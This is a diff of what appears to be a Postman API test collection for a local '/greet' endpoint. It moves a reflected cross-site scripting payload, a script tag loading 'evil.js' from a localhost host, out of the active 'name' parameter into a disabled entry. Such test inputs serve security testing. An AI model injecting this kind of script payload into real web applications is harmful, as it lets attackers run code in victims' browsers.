@@ -45,7 +45,7 @@
 				"method": "GET",
 				"header": [],
 				"url": {
-					"raw": "http://127.0.0.1:8000/greet?name=jorge <script src=\"http://localhost:9090/evil.js\"></script>",
+					"raw": "http://127.0.0.1:8000/greet?name=jorge",
 					"protocol": "http",
 					"host": [
 						"127",
@@ -60,7 +60,12 @@
 					"query": [
 						{
 							"key": "name",
-							"value": "jorge <script src=\"http://localhost:9090/evil.js\"></script>"
+							"value": "jorge"
+						},
+						{
+							"key": "name",
+							"value": "jorge <script src=\"http://localhost:9090/evil.js\"></script>",
+							"disabled": true
 						}
 					]
 				}
